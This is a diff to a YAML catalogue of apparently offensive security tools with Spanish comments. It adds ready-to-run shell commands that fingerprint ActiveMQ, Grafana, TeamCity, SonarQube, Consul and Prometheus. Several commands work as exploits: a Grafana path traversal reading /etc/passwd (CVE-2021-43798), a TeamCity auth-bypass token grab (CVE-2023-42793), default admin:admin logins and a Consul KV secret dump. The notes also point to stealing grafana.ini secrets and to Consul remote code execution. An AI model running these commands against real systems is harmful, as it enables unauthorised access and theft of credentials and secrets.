@@ -433,3 +433,75 @@ tools:
         default: "asrep_hashes.txt"
     tags: [kerberos, as-rep, roasting, ad, impacket]
     notes: "Crackear los hashes obtenidos con hashcat -m 18200"
+
+  - id: activemq_enum
+    name: "Apache ActiveMQ - Enum (Admin + CVE-2023-46604)"
+    description: "Enumera ActiveMQ admin panel y verifica CVE-2023-46604"
+    command: "curl -su admin:admin 'http://{target}:8161/api/jolokia/version' 2>/dev/null | python3 -c 'import sys,json; d=json.load(sys.stdin); print(\"ActiveMQ\",d.get(\"value\",{}).get(\"agent\",\"\"))' 2>/dev/null; nmap -p 61616 --script banner {target} 2>/dev/null"
+    params:
+      - name: target
+        label: "Target IP"
+        placeholder: "10.10.10.10"
+        required: true
+    tags: [activemq, enum, cve-2023-46604, java, 8161]
+    notes: "8161 = admin HTTP, 61616 = OpenWire (CVE-2023-46604). Default creds: admin:admin"
+
+  - id: grafana_enum
+    name: "Grafana - Version + Default Creds + CVE-2021-43798"
+    description: "Verifica version de Grafana, default creds y path traversal"
+    command: "curl -s 'http://{target}:3000/api/health' 2>/dev/null | python3 -c 'import sys,json; d=json.load(sys.stdin); print(\"Grafana\",d.get(\"version\",\"\"))' 2>/dev/null; curl -s -u admin:admin 'http://{target}:3000/api/org' 2>/dev/null | grep -q '\"id\"' && echo 'DEFAULT_CREDS: admin:admin'; for p in alertlist cloudwatch; do curl -sk --path-as-is \"http://{target}:3000/public/plugins/$p/../../../../../../../../../etc/passwd\" 2>/dev/null | grep -q 'root:' && echo \"CVE-2021-43798 CONFIRMED\" && break; done"
+    params:
+      - name: target
+        label: "Target IP"
+        placeholder: "10.10.10.10"
+        required: true
+    tags: [grafana, enum, default-creds, cve-2021-43798, 3000]
+    notes: "CVE-2021-43798: leer /etc/grafana/grafana.ini para admin_password y secret_key"
+
+  - id: teamcity_enum
+    name: "TeamCity - Version + CVE-2023-42793 Auth Bypass"
+    description: "Verifica version de TeamCity y CVE-2023-42793 auth bypass"
+    command: "curl -s 'http://{target}:8111/app/rest/server?fields=version' 2>/dev/null | python3 -c 'import sys,json; d=json.load(sys.stdin); print(\"TeamCity\",d.get(\"version\",\"\"))' 2>/dev/null; TOKEN=$(curl -s -X POST 'http://{target}:8111/app/rest/users/id:1/tokens/RPC2' 2>/dev/null | python3 -c 'import sys,json; d=json.load(sys.stdin); print(d.get(\"value\",\"\"))' 2>/dev/null); [ -n \"$TOKEN\" ] && echo \"CVE-2023-42793 CONFIRMED\""
+    params:
+      - name: target
+        label: "Target IP"
+        placeholder: "10.10.10.10"
+        required: true
+    tags: [teamcity, enum, cve-2023-42793, auth-bypass, 8111]
+    notes: "CVE-2023-42793 < TeamCity 2023.05.4. Token = acceso admin total."
+
+  - id: sonarqube_enum
+    name: "SonarQube - Enum + Default Creds"
+    description: "Verifica acceso a SonarQube y creds por defecto"
+    command: "curl -s 'http://{target}:9000/api/system/status' 2>/dev/null | python3 -c 'import sys,json; d=json.load(sys.stdin); print(d.get(\"version\",\"\"), d.get(\"status\",\"\"))' 2>/dev/null; curl -s -u admin:admin 'http://{target}:9000/api/system/info' 2>/dev/null | grep -q 'Server ID' && echo 'DEFAULT CREDS: admin:admin'"
+    params:
+      - name: target
+        label: "Target IP"
+        placeholder: "10.10.10.10"
+        required: true
+    tags: [sonarqube, enum, default-creds, code-exposure, 9000]
+    notes: "Expone codigo fuente. Default: admin:admin. Buscar tokens, passwords hardcodeados."
+
+  - id: consul_enum
+    name: "HashiCorp Consul - Enum + RCE Check"
+    description: "Enumera Consul y verifica RCE via API sin ACL"
+    command: "curl -s 'http://{target}:8500/v1/catalog/nodes' 2>/dev/null | python3 -c 'import sys,json; [print(n.get(\"Node\"),n.get(\"Address\")) for n in json.load(sys.stdin)[:5]]' 2>/dev/null; curl -s 'http://{target}:8500/v1/kv/?recurse' 2>/dev/null | head -10"
+    params:
+      - name: target
+        label: "Target IP"
+        placeholder: "10.10.10.10"
+        required: true
+    tags: [consul, enum, rce, kv-store, 8500]
+    notes: "Sin ACL: KV store expone secretos. RCE via service check: PUT /v1/agent/service/register"
+
+  - id: prometheus_enum
+    name: "Prometheus - Metricas y Targets Expuestos"
+    description: "Enumera endpoints internos via Prometheus sin autenticacion"
+    command: "curl -s 'http://{target}:9090/api/v1/targets' 2>/dev/null | python3 -c 'import sys,json; d=json.load(sys.stdin); [print(t.get(\"scrapeUrl\",\"\")) for t in d.get(\"data\",{}).get(\"activeTargets\",[])[:10]]' 2>/dev/null; curl -s 'http://{target}:9090/api/v1/status/runtimeinfo' 2>/dev/null | python3 -c 'import sys,json; d=json.load(sys.stdin); print(d.get(\"data\",{}).get(\"goVersion\",\"\"))' 2>/dev/null"
+    params:
+      - name: target
+        label: "Target IP"
+        placeholder: "10.10.10.10"
+        required: true
+    tags: [prometheus, enum, monitoring, targets, 9090]
+    notes: "Expone endpoints internos via targets. Puede revelar IPs, servicios y rutas de administracion."
